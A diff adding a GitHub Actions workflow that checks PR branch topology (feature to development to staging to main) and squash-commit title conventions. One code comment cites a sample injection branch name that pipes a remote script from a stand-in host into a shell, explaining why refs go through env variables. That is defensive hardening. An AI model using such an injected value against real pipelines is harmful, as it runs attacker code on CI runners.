@@ -1,0 +1,115 @@
+name: branch-flow
+
+# Branch protection and rulesets are unavailable on a PRIVATE repository on the
+# GitHub Free plan — the API answers 403 "Upgrade to GitHub Pro or make this
+# repository public". So the flow is enforced here instead, as a required-looking
+# check plus a local pre-push hook (.githooks/pre-push).
+#
+# Honest limit: without branch protection a red check cannot BLOCK a merge — you
+# can still click through it. It makes the mistake loud and logged, which for a
+# single developer is most of the value. The moment this repo is on Pro, run
+# `just gh-protect` and the same rules become unbypassable.
+
+on:
+  pull_request:
+    types: [opened, edited, reopened, synchronize]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+concurrency:
+  group: branch-flow-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  topology:
+    runs-on: ubuntu-latest
+    steps:
+      # Title and branch names go through env, never through ${{ }} inside the
+      # script body: a branch named `$(curl evil.sh|sh)` would otherwise execute.
+      - name: A PR must flow feature → development → staging → main
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          set -uo pipefail
+          fail() { echo "::error::$1"; exit 1; }
+          echo "head: $HEAD_REF   base: $BASE_REF"
+
+          case "$HEAD_REF" in
+            development)
+              [ "$BASE_REF" = "staging" ] || fail \
+                "development promotes to staging, never to '$BASE_REF'."
+              ;;
+            staging)
+              [ "$BASE_REF" = "main" ] || fail \
+                "staging promotes to main, never to '$BASE_REF'."
+              ;;
+            hotfix/*)
+              [ "$BASE_REF" = "main" ] || fail \
+                "a hotfix branch targets main. Ordinary fixes branch from development and use fix/<slug>."
+              ;;
+            phase-*/group-*|fix/*|chore/*|docs/*|refactor/*|perf/*|test/*|dependabot/*|release/*)
+              [ "$BASE_REF" = "development" ] || fail \
+                "work branches merge into development, not '$BASE_REF'. Re-target this PR: gh pr edit --base development"
+              ;;
+            *)
+              fail "branch name '$HEAD_REF' is not in the scheme. Use phase-<n>/group-<m>-<slug>, or fix/ chore/ docs/ refactor/ perf/ test/ hotfix/ — see docs/implementation/02-development-workflow.md §8."
+              ;;
+          esac
+          echo "topology OK"
+
+      # A squash-merge uses the PR TITLE as the commit subject. So the title is
+      # the commit message, and conventions §8 applies to it — not to the messages
+      # on the branch, which get squashed away.
+      - name: PR title is the squash commit message, so it obeys conventions §8
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          set -uo pipefail
+          case "$HEAD_REF" in
+            development|staging|hotfix/*)
+              echo "promotion or hotfix PR — merged with a merge commit, so the title is free text. Skipping."
+              exit 0 ;;
+          esac
+
+          types='feat|fix|test|docs|chore|refactor|perf'
+          scopes='domain|db|sync|hardware|fiscal|terminal|server|backoffice|repo|impl'
+
+          if ! printf '%s' "$TITLE" | grep -qE "^($types)\(($scopes)\): .+"; then
+            echo "::error::PR title must be '<type>(<scope>): <summary>   [<step>]'."
+            echo "::error::type  ∈ $types"
+            echo "::error::scope ∈ $scopes"
+            echo "::error::got: $TITLE"
+            exit 1
+          fi
+
+          # ≤ 72 characters before the step tag, imperative, no trailing period.
+          subject=$(printf '%s' "$TITLE" | sed -E 's/[[:space:]]*\[[^]]*\][[:space:]]*$//')
+          if [ "${#subject}" -gt 72 ]; then
+            echo "::error::summary is ${#subject} characters before the step tag; the limit is 72."
+            exit 1
+          fi
+          case "$subject" in
+            *.) echo "::error::no trailing period in a commit summary."; exit 1 ;;
+          esac
+          echo "title OK: $subject"
+
+  # A promotion PR must be merged with a MERGE COMMIT. Squashing it rewrites the
+  # commits, so staging and development stop sharing history and every later
+  # promotion re-proposes the same work forever. CI cannot choose the merge button,
+  # so it says so loudly on the PR that is about to get it wrong.
+  promotion-notice:
+    if: github.head_ref == 'development' || github.head_ref == 'staging'
+    runs-on: ubuntu-latest
+    steps:
+      # Through env, for the same reason as the topology job above: a ref name is
+      # attacker-shaped input, and "it is guarded by the `if`" is a rule about
+      # head_ref that says nothing about base_ref.
+      - env:
+          HEAD_REF: ${{ github.head_ref }}
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          echo "::warning::Promotion PR ($HEAD_REF → $BASE_REF) — use 'Create a merge commit'. A squash here permanently forks the branches."
